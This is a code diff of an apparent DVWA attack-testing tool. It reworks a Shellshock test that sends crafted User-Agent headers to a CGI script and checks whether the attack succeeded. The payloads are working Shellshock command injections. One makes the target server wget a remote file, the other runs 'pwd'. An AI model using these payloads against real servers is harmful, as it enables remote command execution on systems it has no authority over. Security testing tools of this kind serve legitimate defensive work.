@@ -1327,10 +1327,6 @@ class DVWAAttacks:
         #print response.code
         
     def attackrequest_headers(self, fp, targetpage):
-        '''
-            this will be a combo of known stuff and
-            vectors coming from headers.txt
-        '''
         targetpage = vars.getUrl()
         discattacks = []
         pvect = ''
@@ -1374,15 +1370,15 @@ class DVWAAttacks:
                                             target=targetpage, vect=the_vect)   
         ########################################################################
         ssv_header_attack = "Shellshock vector - HTTP Request Header Attack"
-        req_headers = {}
         wget_remote_file = "https://resources.bayshorenetworks.com/145eb731643f6f3516f2b5b41637a3dcc1a593404810a150f37f886195b2e2e3/bin_malicious_md5_hashes.MD5.txt"
         
         tme = time.localtime()
         time_string = time.strftime("%m.%d.%y.%H:%M:%S", tme)
         wget_file_name = "shellshock_test_{}".format(time_string)
-        wget_file_path = "%s%s" % (vars.dvwa_server_path, wget_file_name)        
+        wget_file_path = "%s%s" % (vars.dvwa_server_path, wget_file_name)
+        targetpage = vars.getUrl() + "/cgi-bin/shellshock.cgi"
         
-        # shellshock vectors
+        # shellshock vector
         shellshock_wget_vector = {"User-Agent":"() { :;}; /bin/bash -c \"wget --no-check-certificate -O %s %s\"" % (wget_file_path, wget_remote_file),
                                   "Content-Type":"text/plain"}
                               
@@ -1392,7 +1388,7 @@ class DVWAAttacks:
             expect a 500 err from server here
         '''
         try:
-            request = urllib2.Request(vars.getUrl() + "/cgi-bin/shellshock.cgi", None, shellshock_wget_vector)
+            request = urllib2.Request(targetpage, None, shellshock_wget_vector)
             response = fp.open(request)
         except:
             pass
@@ -1400,17 +1396,18 @@ class DVWAAttacks:
         '''
         print response.info()
         print response.code
-        print req_headers
         '''
         
         test_targetpage = vars.getUrl() + vars.getHackableUploadPath()
         flist = funcs.getServerMalwareList(fp, test_targetpage)
         shellshock_hit = False
+        pvect = shellshock_wget_vector["User-Agent"]
+        
         if wget_file_name in flist:
             shellshock_hit = True
                 
         if shellshock_hit:
-            discattacks.append(shellshock_wget_vector["User-Agent"])
+            discattacks.append(pvect)
             vars.typecount['request_headers'][1] += 1
             self.htmlgen.writeHtmlTableCell(success=True, attackType=ssv_header_attack,
                                             target=targetpage, vect=pvect)
@@ -1419,12 +1416,41 @@ class DVWAAttacks:
             self.htmlgen.writeHtmlTableCell(success=False, attackType=ssv_header_attack,
                                             target=targetpage, vect=pvect) 
         ########################################################################
+        shellshock_wget_vector = {"User-Agent":"() { :;}; /bin/bash -c \"pwd\"", "Content-Type":"text/plain"}
 
-
-
-
+        vars.typecount['request_headers'][0] += 1
+     
+        response = ''
+        #bad_header_regex = r"""(.*Bad header=.*)"""
+        bad_header_regex = r"""(Bad header=.*)"""
+        pvect = shellshock_wget_vector["User-Agent"]
+   
+        try:
+            request = urllib2.Request(targetpage, None, shellshock_wget_vector)
+            response = fp.open(request)
+        except:
+            pass
         
-
+        '''
+        print response.info()
+        print response.code
+        print response.read()
+        print
+        '''
+        match_bad_header = re.search(bad_header_regex, response.read())
+        if response.code == 500 and match_bad_header:
+            bad_hdr_line = match_bad_header.group(1)
+            
+            print bad_hdr_line
+            
+            discattacks.append(pvect)
+            vars.typecount['request_headers'][1] += 1
+            self.htmlgen.writeHtmlTableCell(success=True, attackType=ssv_header_attack,
+                                            target=targetpage, vect=pvect)
+        else:
+            vars.typecount['request_headers'][2] += 1
+            self.htmlgen.writeHtmlTableCell(success=False, attackType=ssv_header_attack,
+                                            target=targetpage, vect=pvect)
         ########################################################################        
         if len(discattacks) > 0:
             return discattacks
